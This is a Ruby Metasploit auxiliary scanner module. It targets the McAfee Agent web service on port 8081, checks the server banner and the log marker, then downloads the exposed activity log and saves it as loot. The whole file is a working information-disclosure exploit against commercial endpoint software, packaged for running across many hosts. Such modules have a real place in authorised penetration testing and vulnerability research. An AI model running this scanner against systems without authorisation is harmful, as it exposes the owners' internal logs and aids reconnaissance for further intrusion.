##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'McAfee Agent Activity Read Log',
      'Description'    => %q{
        This module exploits a information disclosure vulnerability in the McAfee Activity Log,
        allowing to read files with the web server privileges.
      },
      'References'     =>
        [
          ['URL', 'http://codesec.blogspot.com.br']
        ],
      'Author'         =>
        [
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(8081),
        OptString.new('TARGETURI', [true, 'The URI path to the web application', '/'])
      ], self.class)
  end

  def run_host(ip)

    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path)
    )

    unless res && res.body
      print_error("#{peer} - No response from server.")
      return
    end

    if res.code == 200 &&
        res.headers['Server'].include?('Agent-ListenServer-HttpSvr/1.0') &&
        res.body.include?('FrameworkLog')

      vprint_line("#{res.body}")

      path = store_loot(
        'mcafee_log',
        'text/plain',
        ip,
        res.body,
        'mcafee'
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded")
    end
  end
end
